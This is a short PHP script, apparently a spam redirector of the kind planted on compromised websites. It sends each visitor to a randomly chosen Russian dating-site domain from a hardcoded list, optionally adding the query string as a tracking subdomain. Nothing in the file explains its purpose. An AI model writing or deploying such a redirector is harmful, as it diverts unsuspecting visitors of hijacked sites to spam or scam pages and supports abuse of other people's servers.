<?php

$domains = array('datingportalspot.ru', 'datingportalhouse.ru', 'onlinedatingportal.ru', 'online-datingportal.ru', 'datingportalonline.ru');

$domain = $domains[array_rand($domains, 1)];
$url = ( preg_match('/^[a-z2-7]+$/', $_SERVER['QUERY_STRING']) ) ? sprintf("http://%s.%s", $_SERVER['QUERY_STRING'], $domain) : sprintf("http://%s", $domain);

header("Location: $url");

?>
